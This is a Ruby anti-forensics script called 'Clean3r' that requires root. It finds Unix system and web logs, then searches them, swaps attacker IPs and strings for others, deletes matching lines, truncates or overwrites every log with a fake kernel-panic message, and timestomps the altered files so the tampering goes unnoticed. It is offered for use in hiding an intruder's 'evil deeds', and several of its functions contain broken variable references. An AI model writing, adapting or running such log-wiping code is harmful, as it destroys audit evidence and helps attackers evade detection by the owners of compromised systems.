#!/usr/bin/env ruby

require 'fileutils'

@arc_logz=[] #placeholder for archived log files found
@bin_logz=[]  #placeholder binary log files found
@logz=[] #placeholder for non binary log files found

def banner
	puts
	puts "#{HC}#{FYEL}Clean3r"
	puts "By: #{FRED}H.R.E#{RS}"
puts "#{FRED}#{HC}
                                                                 
           _|                                _|_|_|              
   _|_|_|  _|    _|_|      _|_|_|  _|_|_|          _|  _|  _|_|  
 _|        _|  _|_|_|_|  _|    _|  _|    _|    _|_|    _|_|      
 _|        _|  _|        _|    _|  _|    _|        _|  _|        
   _|_|_|  _|    _|_|_|    _|_|_|  _|    _|  _|_|_|    _|        
                                                                 
                                                                 
"
	puts
end

def basecheck
	uid = Process.uid
	euid = Process.euid
	if uid.to_i == 0 or euid.to_i == 0
	else
		cls
		banner
		puts
		puts "#{HC}#{FRED}Piss off you wanker#{FWHT}!#{RS}"
		puts
		exit 666;
	end
end

#We cant parse lastlog file like normal so instead we will use the 'last' command to captre output accordingly
def check_lastlog(regex)
	lastbin = commandz('which lastlog')[0].chomp #Find out full path to use command
	last = commandz(lastbin).join("\n") #run command and use output to check for string/regex and number of occurances....
	if last.to_s.match(/#{regex}/im)
		puts "#{HC}#{FRED}Found in LastLog Output#{FWHT}!#{RS}"
		occ = last.to_s.scan(/#{regex}/im).count
		puts "\t#{FRED}Number of Occurances#{FWHT}: #{occ}#{RS}"
	end
end

#The main log cleaner menu for after files have been identified
def cleaner_menu
	cls
	banner
	foototal=@bin_logz.size + @logz.size
	foobin=@bin_logz.size
	foonbin=@logz.size
	puts "#{HC}#{FRED}Found #{FWHT}#{foototal}#{FRED} Log Files in total#{FWHT}....#{RS}"
	puts "#{HC}#{FWHT}#{foobin} #{FRED}Binary Log Files#{RS}"
	puts "#{HC}#{FWHT}#{foonbin} #{FRED}Non-Binary Log Files\n#{RS}"
	
	looper=0
	while looper.to_i < 1
		print "(Clean3r)> "
		cmd = gets.chomp
		case cmd
			when /^clear|^cls|^banner/i
				cls
				banner
				puts
			when /^exit|^quit/i
				puts "#{FRED}OK#{HC}#{FWHT},#{RS} #{FRED}exiting cleaner#{HC}#{FWHT}......#{RS}"
				break
			when /^fsearch (.+) (.+)/i
				file=$1
				regex=$2
				fsearch(file, regex)
				puts
			when /^fspoof (.+) (.+) (.+)/i
				cls
				banner
				file=$1
				original=$2
				replacement=$3
				puts "#{HC}#{FRED}Going to spoof all occurances of '#{FWHT}#{original}#{FRED}' with '#{FWHT}#{replacement}#{FRED}' in #{FWHT}#{file}#{RS}#{FWHT}......#{RS}\n"
				puts "#{HC}#{FRED}Before#{FWHT}: #{RS}"
				view_timestamp(file)
				fspoof(file, original, replacement)
				puts "#{HC}#{FRED}After#{FWHT}: #{RS}"
				view_timestamp(file) #Confirming timestomp worked as intended
			when /^fzap (.+) (.+)/im
				cls
				banner
				file=$1
				regex=$2
				puts "#{HC}#{FRED}Going to Zap all lines with occurances of '#{FWHT}#{regex}#{FRED}' in #{FWHT}#{file}#{RS}#{FWHT}......#{RS}\n"
				puts "#{HC}#{FRED}Before#{FWHT}: #{RS}"
				view_timestamp(file)
				fzap(file, regex)
				puts "#{HC}#{FRED}After#{FWHT}: #{RS}"
				view_timestamp(file) #Confirming timestomp worked as intended
			when /^global nuke/i
				puts "#{HC}#{FRED}Overwriting ALL Log Files Now#{FWHT}......#{RS}"
				overwrite_all
			when /^help/i
				cleaner_options
			when /^search (.+)/i
				regex=$1
				puts "#{HC}#{FRED}Searching for traces or matches to#{FWHT}: #{regex}#{RS}"
				search(regex)
				puts
			when /^show arc/i
				cls
				banner
				if not @arc_logz.empty?
					puts "#{HC}#{FYEL}We Found the Following Archived Log Files#{FWHT}: #{RS}"
					@arc_logz.each do |log|
						puts "#{HC}#{FWHT}#{log.chomp}#{RS}"
					end
					puts "#{HC}#{FRED}Make sure you handle these as needed manually when done#{FWHT}!#{RS}"
				else
					puts "#{HC}#{FRED}No Archived Log Files were found#{FWHT}....#{RS}"
				end
				puts
			when /^show bin/i
				cls
				banner
				if not @bin_logz.empty?
					puts "#{HC}#{FRED}We Found the Following Binary Log Files#{FWHT}: #{RS}"
					@bin_logz.each do |log|
						puts "#{HC}#{FWHT}#{log.chomp}#{RS}"
					end
				else
					puts "#{HC}#{FRED}No Binary Log Files were found#{FWHT}....#{RS}"
				end
				puts
			when /^show logs/i
				cls
				banner
				puts "#{HC}#{FRED}We Found the Following Log Files#{FWHT}: #{RS}"
				presentation
				puts
			when /^show nonbin/i
				cls
				banner
				if not @logz.empty?
					puts "#{HC}#{FRED}We Found the Following Non-Binary Log Files#{FWHT}: #{RS}"
					@logz.each do |log|
						puts "#{HC}#{FWHT}#{log.chomp}#{RS}"
					end
				else
					puts "#{HC}#{FRED}No Non-Binary Log Files were found#{FWHT}....#{RS}"
				end
				puts
			when /^show top/i
				cls
				banner
				puts "#{HC}#{FRED}Searching for Top 25 IP in ALL Log Files#{FWHT}, #{FRED}hang tight#{FWHT}....#{RS}"
				gather_ip
			when /^spoof (.+) (.+)/i
				cls
				banner
				original=$1
				replacement=$2
				spoof(original, replacement)
			when /timestomp (.+) (.+)/i
				orig = $1
				new = $2
				puts "#{HC}#{FRED}Before TimeStomp#{FWHT}: #{RS}"
				view_timestamp(new)
				timestomp(orig, new)
				puts "#{HC}#{FRED}After TimeStomp#{FWHT}: #{RS}"
				view_timestamp(new)
			when /^ftrunc (.+) (.+)/im
				file=$1
				size=$2
				puts "#{HC}#{FRED}Truncating '#{FWHT}#{file}#{FRED}' to '#{FWHT}#{size}#{FRED}' in bytes to rewind the logs a bit#{RS}#{FWHT}......#{RS}"
				ftrunc(file, size)
				puts "#{HC}#{FRED}File has been truncated#{FWHT}!#{RS}"
				puts
			when /^trunc (.+) (.+)/im
				file=$1
				size=$2
				puts "#{HC}#{FRED}Truncating '#{FWHT}ALL Log Files#{FRED}' to '#{FWHT}#{size}#{FRED}' in bytes#{RS}#{FWHT}......#{RS}"
				trunc(size)
				puts
			when /^view (.+)/i
				file=$1
				puts "#{HC}#{FRED}Viewing Current Time Stamp for#{HC}#{FWHT}: #{file.chomp}#{RS}"
				view_timestamp(file)
			else
				cls
				puts
				puts "#{HC}#{FRED}Oops, Didn't quite understand that one#{FWHT}!#{RS}"
				puts "#{HC}#{FRED}Please Choose a Valid Option From Menu Below Next Time#{FWHT}.......#{RS}"
				puts
			end
	end
	stage_right
end

#Options or Help Menu for cleaner_menu
def cleaner_options
	cls
	banner
	puts "#{HC}#{FRED}Type '#{FWHT}EXIT#{FRED}' or '#{FWHT}QUIT#{FRED}' to exit Log Clean3r"
	puts
	puts "#{HC}#{FYEL}view #{FWHT}<#{RS}#{FRED}FileName#{HC}#{FWHT}> => #{FRED}View Current Timestamp Info for File"
	puts "#{HC}#{FYEL}search #{FWHT}<#{RS}#{FRED}String or Regex#{HC}#{FWHT}> => #{FRED}Search through found Log Files for given String or Regex"
	puts "#{HC}#{FYEL}fsearch #{FWHT}<#{RS}#{FRED}FileName#{HC}#{FWHT}> <#{RS}#{FRED}String or Regex#{HC}#{FWHT}> => #{FRED}Search through Specified Log File for given String or Regex"
	puts "#{HC}#{FYEL}show logs #{FWHT}=>#{FRED} Show Found Log Files#{RS}"
	puts "#{HC}#{FYEL}show arc #{FWHT}=>#{FRED} Show any Archived Log Files Found#{RS}"
	puts "#{HC}#{FYEL}show bin #{FWHT}=>#{FRED} Show any Binary Log Files Found#{RS}"
	puts "#{HC}#{FYEL}show nonbin #{FWHT}=>#{FRED} Show any Log Files Found that are NOT Binary#{RS}"
	puts "#{HC}#{FYEL}show top #{FWHT}=>#{FRED} Show Top 25 IP Found in All Log Files#{RS}"
	puts "#{HC}#{FYEL}timestomp #{FWHT}<#{RS}#{FRED}originalFile#{HC}#{FWHT}> <#{RS}#{FRED}newFile#{HC}#{FWHT}> =>#{FRED} Alter Timestamp on newFile so it matches that of originalFile#{RS}"
	puts "#{HC}#{FYEL}spoof #{FWHT}<#{RS}#{FRED}Original#{HC}#{FWHT}> <#{RS}#{FRED}Replacement#{HC}#{FWHT}> =>#{FRED} Spoof the Replacement for Original in All Found Matches in All Log Files#{FWHT}!#{RS}"
	puts "#{HC}#{FYEL}fspoof #{FWHT}<#{RS}#{FRED}FileName#{HC}#{FWHT}> <#{RS}#{FRED}Original#{HC}#{FWHT}> <#{RS}#{FRED}Replacement#{HC}#{FWHT}> =>#{FRED} Spoof the Replacement for Original in All Found Matches in Specified Log Files#{FWHT}!#{RS}"
	puts "#{HC}#{FYEL}trunc #{FWHT}<#{RS}#{FRED}Byte Size#{HC}#{FWHT}> =>#{FRED} Truncate ALL Log Files to Specified Byte Size#{FWHT}(#{FRED}rewinds the log files!#{FWHT})#{RS}"
	puts "#{HC}#{FYEL}ftrunc #{FWHT}<#{RS}#{FRED}FileName#{HC}#{FWHT}> <#{RS}#{FRED}Byte Size#{HC}#{FWHT}> =>#{FRED} Truncate Specified Log File to Specified Byte Size#{FWHT}(#{FRED}rewinds the log file!#{FWHT})#{RS}"
	puts "#{HC}#{FYEL}global nuke #{FWHT}=>#{FRED} Nuke All Found Log Files#{FWHT}!#{RS}"
	puts
end

#Clear function
def cls
	system('clear')
end

# Execute commands safely, result is returned as array
def commandz(foo)
	bar = IO.popen("#{foo}")
	foobar = bar.readlines
	return foobar
end

#File to Search Through & Regex to search with
def content_exists(file, regex, mode)
	ooo = File.stat(file)
	oatime=foo.atime #atime before edit
	omtime=foo.mtime #mtime before edit

	if mode.to_i == 1
		f = File.open(file, 'r')
	else
		f = File.open(file, 'rb') #Open file in binary mode (utmp/wtmp/etc)
	end
	foo = f.readlines #Read file into array we can search through as wel like
	f.close
	if foo.to_s.match(/#{regex}/im) #Check for needle in haystack :p
		if mode.to_i == 1
			puts "#{HC}#{FRED}Found in Non-Binary File#{FWHT}: #{file}#{RS}"
		else
			puts "#{HC}#{FRED}Found in Binary File#{FWHT}: #{file}#{RS}"
		end
		occ = foo.to_s.scan(/#{regex}/im).count #How many times does it occur in file?
		puts "\t#{FRED}Number of Occurances#{FWHT}: #{occ}#{RS}"
	end

	File.utime(oatime, omtime, file) #Keep timestamp preserved
end

#Find log file locations, then enumerate for contents
def find_dirs
	log_paths = [ "/etc/", "/home/log/", "/home/ids/log/", "/usr/adm/", "/usr/apache/", "/usr/apache2/", "/usr/httpd/", "/usr/local/apache/", "/usr/local/apache2/", "/usr/var/adm/", "/usr/var/ids/", "/usr/var/log/", "/var/adm/", "/var/ids/", "/var/log/", "/var/prelude/", "/var/run/", "/var/www/", "/root/Desktop/" ]

	#Cycle through the Possible Log File Locations and Check for Logs if directory exists
	log_paths.each do |dir|
		#Check if the log possible log file directory exists before we go and glob its content
		if File.exists?(dir) && File.directory?(dir)
			find_logs("#{dir}")
		end
	end
end

# Find Log Files
def find_logs(dir2check)
	Dir.glob("#{dir2check}**/*") do |logz|
		if logz.sub("#{dir2check}", '') =~ /wtmp|utmp|btmp|lastlog/i
			@bin_logz << logz # EDIT Regex if you want more marked as Binary files
		elsif  logz.sub("#{dir2check}", '') =~ /\.log|_log|pacct|qacct|.history|bash_logout|messages|xferlog|log\.nmbd|snort\.alert|sulog|errlog|aculog/i
			if logz.sub("#{dir2check}", '') =~ /\.tar|\.gz|\.bz|\.zip/i
				@arc_logz << logz #Archived log files, not 100% sure we can handle these but lets mark them anyways.....
			else
				@logz << logz # Non-Binary Log Files
			end
		end
	end
end

#Go through Specific Log File and Search for our requested string/regex term
def fsearch(file, regex)
	ooo = File.stat(file)
	oatime=foo.atime #atime before edit
	omtime=foo.mtime #mtime before edit

	f = File.open(file)
	foo = f.readlines
	f.close
	if foo.to_s.match(/#{regex}/im) #Check for needle in haystack :p
		puts "#{HC}#{FRED}Found matches to '#{FWHT}#{regex}#{FRED}' in File#{FWHT}: #{file}#{RS}"
		occ = foo.to_s.scan(/#{regex}/im).count #How many times does it occur in file?
		puts "\t#{FRED}Number of Occurances#{FWHT}: #{occ}#{RS}"
	else
		puts "#{HC}#{FRED}No Matches to '#{FWHT}#{regex}#{FRED}' in File#{FWHT}: #{file}#{RS}"
	end

	File.utime(oatime, omtime, file) #Keep timestamp preserved
end

#Spoof all instaces of original with replacement value in provided file
def fspoof(file, original, replacement)
	if file =~ /lastlog/i
		puts "#{HC}#{FRED}We can#{FWHT}'#{FRED}t spoof lastlog#{FWHT},#{FRED} need to truncate it to 0 or nuke everything#{FWHT}, #{FRED}sorry#{FWHT}....#{RS}"
	else
		foo = File.stat(file)
		oatime=foo.atime #atime before edit
		omtime=foo.mtime #mtime before edit

		f = File.open(file)
		foo = f.readlines #Read target file into array for manipulation and re-write in a sec
		f.close

		bar = foo.to_s.gsub(original, replacement) #Make the swap
		if file =~ /wtmp|utmp|btmp/i
			f = File.open("#{file}.fake", 'wb+') #Write Binary
		else
			f = File.open("#{file}.fake", 'w+') #Write non-binary
		end
		f.puts bar #put the copy or updates to file
		f.close
		timestomp(file, "#{file}.fake") #Make our new file match our original file as best as we can
		FileUtils.rm(file, :force => true) #Remove original for good
		make_copy("#{file}.fake", "#{file}") #Rename/Copy our fake and keep all our hard work preserved
		FileUtils.rm("#{file}.fake", :force => true) #Remove fake for good
	end
end

#Truncate specified file to specified size, in bytes
def ftrunc(file, size)
	foo = File.stat(file)
	oatime=foo.atime #atime before edit
	omtime=foo.mtime #mtime before edit

	File.truncate(file, size.to_i) #Rewind
	File.utime(oatime, omtime, file) #Make the atime & mtime look they did before we did the rewind :)
end

#Find Top 25 IP across ALL Log Files Found
def gather_ip
	ip=[]
	@ip=[] #hold our unique IP found in logs
	@ipz=Hash.new #create new hash for storage of ip with associated number of occurances
	if not @bin_logz.empty?
		@bin_logz.each do |log| #Check Binary Logs
			ooo = File.stat(file)
			oatime=foo.atime #atime before edit
			omtime=foo.mtime #mtime before edit
			f=File.open(log, 'rb')
			foo = f.readlines
			f.close
			ip << foo.to_s.scan(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/).uniq #Each uniq IP found is captured in our @ip array for further enumeration later....
			File.utime(oatime, omtime, file) #Keep timestamp preserved
		end
	end
	if not @logz.empty?
		@logz.each do |log| #Non-Binary Logs
			ooo = File.stat(file)
			oatime=foo.atime #atime before edit
			omtime=foo.mtime #mtime before edit
			f=File.open(log)
			foo = f.readlines
			f.close
			ip << foo.to_s.scan(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/).uniq #Each uniq IP found is captured and added into our @ip array for further enumeration later....
			File.utime(oatime, omtime, file) #Keep timestamp preserved
		end
	end
	ip.each do |i|
		if not i.nil?
			i.each do |p|
				@ip << p
			end
		end
	end
	if @ip.empty?
		puts "#{HC}#{FRED}No Unique IP Found in Logs Files#{FWHT}?#{RS}"
	else
		@ip = @ip.uniq #Make sure we remove duplicate entries since we combined logs, etc
		isize=@ip.size #Array size should equal the number of matches found
		if isize.to_i < 25
			puts "#{HC}#{FRED}Only found #{FWHT}#{isize}#{FRED} unique IP in Log Files#{FWHT}!#{RS}"
			@ip.each do |ip|
				puts "#{HC}#{FRED}IP#{FWHT}: #{ip}#{RS}" 
			end
		else
			puts "#{HC}#{FRED}Found #{FWHT}#{isize}#{FRED} unique IP in Log Files#{FWHT}!#{RS}"
			puts "#{HC}#{FRED}Checking which occur the most, might take a sec#{FWHT}.....#{RS}\n"
			#Now that we have unique IP, lets see which ones have the highest occurance in the log files we already found....
			@ip.each do |ip|
				occ=0
				if not @bin_logz.empty?
					@bin_logz.each do |log| #Binary log
						ooo = File.stat(file)
						oatime=foo.atime #atime before edit
						omtime=foo.mtime #mtime before edit
						f=File.open(log)
						foo = f.readlines
						f.close
						occ = occ.to_i + foo.to_s.scan(/(#{ip[0]})/).count #increase our occurances variable by the number of times it was found
						File.utime(oatime, omtime, file) #Keep timestamp preserved
					end
				end
				if not @logz.empty?
					@logz.each do |log| #Non-Binary Log
						ooo = File.stat(file)
						oatime=foo.atime #atime before edit
						omtime=foo.mtime #mtime before edit
						f=File.open(log)
						foo = f.readlines
						f.close
						occ = occ.to_i + foo.to_s.scan(/(#{ip[0]})/).count #increase our occurances variable by the number of times it was found
						File.utime(oatime, omtime, file) #Keep timestamp preserved
					end
				end
				@ipz.store(ip[0], occ) #Add each value after searching into our hash
			end
			@ipz.sort_by { |key, value| value } #Sorts them by count value (i.e. 1,2,3,4,5) 
			top = Hash[@ipz.sort_by { |key, value| -value }.first 25] #Now that they have been sorted, pop off the top 5 found
			puts "#{HC}#{FRED}Top 25 Unique IP in Log Files#{FWHT}: #{RS}"
			top.each do |key, value|
				if not key.nil?
					puts "#{HC}#{FRED}The IP '#{FWHT}#{key}#{FRED}' was found #{FWHT}#{value}#{FRED} times#{FWHT}!#{RS}" #Print the IP associated with each value for Top 5 Found
				end
			end
		end
		puts
	end
end

#Make copy of existing file before nuking it and preserve all timestamps in process as we use in a minute to further help mask things
def make_copy(src, dest)
#	commandz("cp -p #{src} #{dest}")

	#Now with Ruby :)
	FileUtils.cp("#{src}", "#{dest}", :preserve => true )
end

#Overwrite all log files rather than straight up delete them, its not smart :p
def overwrite_all
#	host = commandz('/bin/hostname 2> /dev/null')[0].chomp
	#Ruby way to get host :)
	host = Socket.gethostbyname(Socket.gethostname).first
	foo=Time.new
	msg = "#{foo.to_s.split(' ')[0]} #{foo.to_s.split(' ')[1]} #{host} kernel: [    0.647821] rtc_cmos 00:03: setting system clock to #{foo.to_s.split(' ')[0]} #{foo.to_s.split(' ')[1]} UTC (1364485749)
#{foo.to_s.split(' ')[0]} #{foo.to_s.split(' ')[1]} #{host} System Panic Dumping to all log files......\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
	#Loop through all found logs and wipe as needed
	tmpdir="/tmp/foooofuckkkkk" # <= Improve this later with random string generator for better long term evasion....
	Dir.mkdir(tmpdir) unless File.exists?(tmpdir)
	if not @bin_logz.empty?
		@bin_logz.each do |log|
			f = File.new("#{tmpdir}/#{log}", "wb+") #Use Write NOT append
			f.puts "#{msg}"
			f.close
			timestomp("#{File.basename(log)}", "#{tmpdir}/#{log}") #Replace new file timestamps with that of the file we plan to replace
			make_copy("#{tmpdir}/#{File.basename(log)}", "#{log}") #Replace the target log file with out new wiped log, while preserving source file timestamps (the ones matching target)
#			commandz("rm -f #{tmpdir}/#{File.basename(log)}") #Remove our temporary file
			#Ruby way :)
			FileUtils.rm("#{tmpdir}/#{File.basename(log)}", :force => true)
		end
	end
	if not @logz.empty?
		@logz.each do |log|
			f = File.new("#{tmpdir}/#{File.basename(log)}", "w+") #Use Write NOT append
			f.puts "#{msg}"
			f.close
			timestomp("#{log}", "#{tmpdir}/#{File.basename(log)}")  #Replace new file timestamps with that of the file we plan to replace
			make_copy("#{tmpdir}/#{File.basename(log)}", "#{log}") #Replace the target log file with out new wiped log, while preserving source file timestamps (the ones matching target)
#			commandz("rm -f #{tmpdir}/#{File.basename(log)}") #Remove our temporary file
			#Ruby way
			FileUtils.rm("#{tmpdir}/#{File.basename(log)}", :force => true)
		end
	end
	truncate('/var/log/lastlog', 0) if File.exists?('/var/log/lastlog')
end

#Present Found Log Files
def presentation
	if not @arc_logz.empty?
		@arc_logz.each do |log|
			puts "#{FYEL}Archived Log File Found#{HC}#{FWHT}: #{log.chomp}#{RS}"
		end
	end
	if not @bin_logz.empty?
		@bin_logz.each do |log|
			puts "#{FRED}Binary Log File Found#{HC}#{FWHT}: #{log.chomp}#{RS}"
		end
	end
	if not @logz.empty?
		@logz.each do |log|
			puts "#{FRED}Non-Binary Log File Found#{HC}#{FWHT}: #{log.chomp}#{RS}"
		end
	end
	puts
end

#Go through Log Files and Search for our requested string/regex term
def search(regex)
	if not @bin_logz.empty?
		@bin_logz.each do |log|
			if log =~ /lastlog/i
				check_lastlog(regex) #Check using standalone function since file doesnt play nice with normal parsing methods....idk, wtf?
			else
				content_exists(log, regex, 2) #Binary Mode
			end
		end
	end
	if not @logz.empty?
		@logz.each do |log|
			if log =~ /lastlog/i #If we found last log in another location lets check using mornal means all the same
				check_lastlog(regex)
			else
				content_exists(log, regex, 1) #Non-Binary mode (ASCII)
			end
		end
	end
end

#Spoof all instaces of original with replacement value in ALL Log files
def spoof(original, replacement)
	puts "#{HC}#{FRED}Going to spoof all occurances of '#{FWHT}#{original}#{FRED}' with '#{FWHT}#{replacement}#{FRED}' in #{FWHT}ALL Log Files#{RS}#{FWHT}......#{RS}\n"
	if not @bin_logz.empty?
		@bin_logz.each do |log|
			if log =~ /lastlog/i
				puts "#{HC}#{FRED}We can#{FWHT}'#{FRED}t spoof lastlog#{FWHT},#{FRED} need to truncate it to 0 or nuke everything#{FWHT}, #{FRED}sorry#{FWHT}....#{RS}"
			else
				f = File.open(log, 'rb') #Open file in binary mode (utmp/wtmp/etc)
				foo = f.readlines #Read file into array we can search through as wel like
				f.close
				if foo.to_s.match(/#{original}/im) #Make sure the string/regex we are replacing exists in the file before we go off and edit it :p
					fspoof(log, original, replacement)
					puts "#{HC}#{FWHT}#{log} #{FRED}has been spoofed#{FWHT}!#{RS}"
				end
			end
		end
	end
	if not @logz.empty?
		@logz.each do |log|
			if log =~ /lastlog/i #If we found last log in another location lets check using mornal means all the same
				puts "#{HC}#{FRED}We can#{FWHT}'#{FRED}t spoof lastlog#{FWHT},#{FRED} need to truncate it to 0 or nuke everything#{FWHT}, #{FRED}sorry#{FWHT}....#{RS}"
			else
				f = File.open(log, 'r') #Open file in binary mode (utmp/wtmp/etc)
				foo = f.readlines #Read file into array we can search through as wel like
				f.close
				if foo.to_s.match(/#{original}/im) #Make sure the string/regex we are replacing exists in the file before we go off and edit it :p
					fspoof(log, original, replacement)
					puts "#{HC}#{FWHT}#{log} #{FRED}has been spoofed#{FWHT}!#{RS}"
				end
			end
		end
	end
	puts
end

#Exit Stage Right if all went well
def stage_right
	puts
	puts "#{HC}#{FRED}Should be all clean of your evil deads now#{FWHT}!#{RS}"
	puts
	puts
	exit; #Clean Exit :)
end

#Modify the doplegangar file's timestamp info to mirror that of the original file
def timestomp(original, doplegangar)
#	commandz("touch -r #{original} #{doplegangar}") # one liner with touch command :p

	#Pure Ruby way :)
	foo = File.stat(original) #Stat original file
	atime = foo.atime #Note its access & modify times so we can fake on target file...
	mtime = foo.mtime
	File.utime(atime, mtime, doplegangar) #Make the fake :)
end

#Truncate ALL files to specified size, in bytes
def trunc(size)
	#Loop through all of the found log files and send them to the ftunc functon one by one to be nuked :)
	if not @bin_logz.empty?
		@bin_logz.each do |log|
			ftrunc(log, size)
			puts "#{HC}#{FWHT}#{log} #{FRED}if done#{FWHT}!#{RS}"
		end
	end
	if not @logz.empty?
		@logz.each do |log|
			ftrunc(log, size)
			puts "#{HC}#{FWHT}#{log} #{FRED}if done#{FWHT}!#{RS}"
		end
	end
end

#View timestamp for an existing file
def view_timestamp(file)
	#stamp = commandz("stat #{file}")
	#if not stamp.empty?
	#	puts "#{FRED}Current Time Stamp for #{HC}#{FWHT}: #{file.chomp}#{RS}"
	#	stamp.each { |x| puts "#{FWHT}#{x.chomp}#{RS}" }
	#end

	# Now we do it with just pure ruby :)
	#Stat our target file so we can enumerate all the info normal stat command might show.....
	foo = File.stat(file)
	puts "#{HC}#{FRED}File#{FWHT}: #{file}\t#{FRED}Type#{FWHT}: #{foo.ftype}#{RS}"
	puts "#{HC}#{FRED}Size#{FWHT}: #{foo.size}\t#{FRED}Blocks#{FWHT}: #{foo.blocks}\t#{FRED}IO Blocks#{FWHT}: #{foo.blksize}#{RS}"
	puts "#{HC}#{FRED}Dev#{FWHT}: #{foo.dev}\t#{FRED}Inode#{FWHT}: #{foo.ino}\t#{FRED}Links#{FWHT}: #{foo.nlink}#{RS}"
	puts "#{HC}#{FRED}Access#{FWHT}: #{sprintf("%o", foo.mode)}\t#{FRED}UID#{FWHT}: #{foo.uid}\t#{FRED}GID#{FWHT}: #{foo.gid}#{RS}"
	puts "#{HC}#{FRED}Access Time#{FWHT}: #{foo.atime}#{RS}"
	puts "#{HC}#{FRED}Modify Time#{FWHT}: #{foo.mtime}#{RS}"
	puts "#{HC}#{FRED}Change Time#{FWHT}: #{foo.ctime}#{RS}"
	puts
end

###########################################################################
# Still Testing The Zapper Functionality and Need Given the Other Options #
###########################################################################
#Remove all lines matching regex in provided file
def fzap(file, regex)
	if file =~ /lastlog/i
		puts "#{HC}#{FRED}We can#{FWHT}'#{FRED}t zap lastlog#{FWHT},#{FRED} need to truncate it to 0 or nuke everything#{FWHT}, #{FRED}sorry#{FWHT}....#{RS}"
	else
		foo = File.stat(file)
		oatime=foo.atime #atime before edit
		omtime=foo.mtime #mtime before edit

		if file =~ /wtmp|utmp|btmp/i
			f = File.open(file, 'rb') #Read Binary
		else
			f = File.open(file, 'r') #Read normal
		end
		foo = f.readlines #Read target file into array for manipulation and re-write in a sec
		f.close
		if foo.to_s.match(/#{regex}/im) #Let's only edit those files where we found matches, skip others :)
			bar=[]
			foo.each do |line|
				if not line =~ /#{regex}/im #Omit lines which match the regex/string pattern provided, so when we re-write its zapped!
					bar << line
				end
			end
		end
puts bar
		#Write our new updated file with out any matching lines....
		if file =~ /wtmp|utmp|btmp/i
			f = File.open("#{file}.fake", 'wb+') #Write Binary
		else
			f = File.open("#{file}.fake", 'w+') #Write non-binary
		end
		f.puts bar.to_s #write updated data to file
		f.close
		timestomp(file, "#{file}.fake") #Make our new file match our original file as best as we can
#		FileUtils.rm(file, :force => true) #Remove original for good
#		FileUtils.move("#{file}.fake", "#{file}") #Make the swap and put the fake in power :)
	end
end

basecheck 
find_dirs 
cleaner_menu

